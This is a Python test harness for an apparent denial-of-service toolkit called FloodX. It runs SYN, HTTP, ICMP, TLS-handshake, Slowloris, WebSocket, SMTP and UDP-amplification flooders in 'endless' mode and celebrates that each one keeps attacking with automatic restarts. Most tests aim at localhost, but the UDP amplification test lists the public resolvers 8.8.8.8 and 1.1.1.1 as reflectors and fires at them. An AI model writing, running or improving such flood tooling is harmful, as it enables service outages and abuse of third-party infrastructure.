#!/usr/bin/env python3
"""
FloodX: Test Endless Attack Capabilities
Verify that all attack vectors have continuous endless operation with restart mechanisms.
"""

import asyncio
import time
from typing import Dict, Any

from common.logger import logger
from common.colors import create_colored_banner, success_text, info_text, accent_text

# Import all attack vectors
from app_layer_attacks.syn_flooder import HighPerformanceSynFlooder
from app_layer_attacks.http_flooder import HttpFlooder
from app_layer_attacks.icmp_flooder import IcmpFlooder
from app_layer_attacks.tls_handshake_flooder import AdvancedTlsHandshakeFlooder
from app_layer_attacks.udp_amplifier import UdpAmplifier
from app_layer_attacks.slowloris import SlowlorisFlooder
from app_layer_attacks.websocket_storm import WebSocketStorm
from app_layer_attacks.smtp_flood import AdvancedSmtpFloodAttack


async def test_attack_endless_capability(attack_class, attack_name: str, config: Dict[str, Any]):
    """Test if an attack vector supports endless continuous operation."""
    logger.info(f"🧪 Testing {attack_name} endless capability...")
    
    try:
        # Create attack instance with duration 0 (endless)
        test_config = config.copy()
        test_config['duration'] = 0  # Set to endless mode
        
        attack = attack_class(test_config)
        
        # Start attack in background
        attack_task = asyncio.create_task(attack.run())
        
        # Let it run for 5 seconds to verify it starts and continues
        await asyncio.sleep(5)
        
        # Check if attack is still running
        if not attack_task.done():
            logger.info(f"✅ {success_text(attack_name)} - Endless mode working!")
            
            # Stop the attack
            attack.running = False
            attack_task.cancel()
            
            try:
                await attack_task
            except asyncio.CancelledError:
                pass
            
            return True
        else:
            logger.error(f"❌ {attack_name} - Attack stopped unexpectedly")
            return False
            
    except Exception as e:
        logger.error(f"❌ {attack_name} - Test failed: {e}")
        return False


async def test_all_endless_attacks():
    """Test all attack vectors for endless continuous operation."""
    print(create_colored_banner())
    logger.info(f"🚀 {success_text('Testing Endless Attack Capabilities')}")
    logger.info("=" * 80)
    
    # Test configurations for different attack types
    test_configs = {
        'syn': {
            'target': '127.0.0.1',
            'port': 80,
            'concurrency': 10,
            'duration': 0,  # Endless
            'spoof_ip': False,  # Disable for localhost testing
            'allow_private': True
        },
        'http': {
            'target': 'http://127.0.0.1:8080',
            'port': 8080,
            'concurrency': 5,
            'duration': 0,  # Endless
            'method': 'GET',
            'allow_private': True
        },
        'icmp': {
            'target': '127.0.0.1',
            'concurrency': 5,
            'duration': 0,  # Endless
            'packet_size': 64,
            'allow_private': True
        },
        'tls': {
            'target': '127.0.0.1',
            'port': 443,
            'concurrency': 5,
            'duration': 0,  # Endless
            'allow_private': True
        },
        'slowloris': {
            'target': '127.0.0.1',
            'port': 80,
            'concurrency': 5,
            'duration': 0,  # Endless
            'allow_private': True
        },
        'websocket': {
            'target': 'ws://127.0.0.1:8080/ws',
            'concurrency': 3,
            'duration': 0,  # Endless
            'message_rate': 5,
            'allow_private': True
        },
        'smtp': {
            'target': '127.0.0.1',
            'port': 25,
            'concurrency': 3,
            'duration': 0,  # Endless
            'allow_private': True
        }
    }
    
    # Attack class mappings
    attack_classes = {
        'syn': HighPerformanceSynFlooder,
        'http': HttpFlooder,
        'icmp': IcmpFlooder,
        'tls': AdvancedTlsHandshakeFlooder,
        'slowloris': SlowlorisFlooder,
        'websocket': WebSocketStorm,
        'smtp': AdvancedSmtpFloodAttack
    }
    
    results = {}
    
    # Test each attack vector
    for attack_name, attack_class in attack_classes.items():
        if attack_name in test_configs:
            config = test_configs[attack_name]
            result = await test_attack_endless_capability(attack_class, attack_name.upper(), config)
            results[attack_name] = result
            
            # Brief pause between tests
            await asyncio.sleep(2)
    
    # Test UDP amplifier separately (different interface)
    logger.info("🧪 Testing UDP Amplifier endless capability...")
    try:
        # Create a minimal reflector file for testing
        with open('test_reflectors.txt', 'w') as f:
            f.write('8.8.8.8:53\n1.1.1.1:53\n')
        
        udp_amp = UdpAmplifier(
            reflectors='test_reflectors.txt',
            protocols=['dns'],
            duration=0,  # Endless
            threads=2,
            spoof_cidrs=None,
            delay=0.1
        )
        
        # Start UDP amplifier in background
        import threading
        udp_thread = threading.Thread(target=udp_amp.start, daemon=True)
        udp_thread.start()
        
        # Let it run for 5 seconds
        await asyncio.sleep(5)
        
        # Check if still running
        if udp_amp.running:
            logger.info(f"✅ {success_text('UDP AMPLIFIER')} - Endless mode working!")
            results['udp'] = True
        else:
            logger.error("❌ UDP AMPLIFIER - Attack stopped unexpectedly")
            results['udp'] = False
        
        # Stop the attack
        udp_amp.running = False
        
        # Clean up test file
        import os
        if os.path.exists('test_reflectors.txt'):
            os.remove('test_reflectors.txt')
            
    except Exception as e:
        logger.error(f"❌ UDP AMPLIFIER - Test failed: {e}")
        results['udp'] = False
    
    # Display final results
    logger.info("=" * 80)
    logger.info(f"🎯 {info_text('ENDLESS ATTACK CAPABILITY TEST RESULTS')}")
    logger.info("=" * 80)
    
    passed = 0
    total = len(results)
    
    for attack_name, result in results.items():
        status_icon = "✅" if result else "❌"
        status_text = success_text("PASS") if result else "FAIL"
        logger.info(f"{status_icon} {attack_name.upper():<15} - {status_text}")
        if result:
            passed += 1
    
    logger.info("=" * 80)
    success_rate = (passed / total) * 100 if total > 0 else 0
    logger.info(f"🏆 {accent_text(f'Overall: {passed}/{total} attacks support endless operation')} ({success_rate:.1f}%)")
    
    if success_rate == 100:
        logger.info(f"🎉 {success_text('ALL ATTACK VECTORS NOW SUPPORT ENDLESS CONTINUOUS OPERATION!')}")
        logger.info(f"🔄 {info_text('Every attack can run endlessly with restart and resend mechanisms')}")
        logger.info(f"🎯 {info_text('Continuous packet/request sending until manually stopped')}")
        logger.info(f"🔧 {info_text('Automatic worker restart for continuous operation')}")
    else:
        logger.info("⚠️  Some attack vectors may need additional endless mode implementation")
    
    return results


if __name__ == "__main__":
    asyncio.run(test_all_endless_attacks())
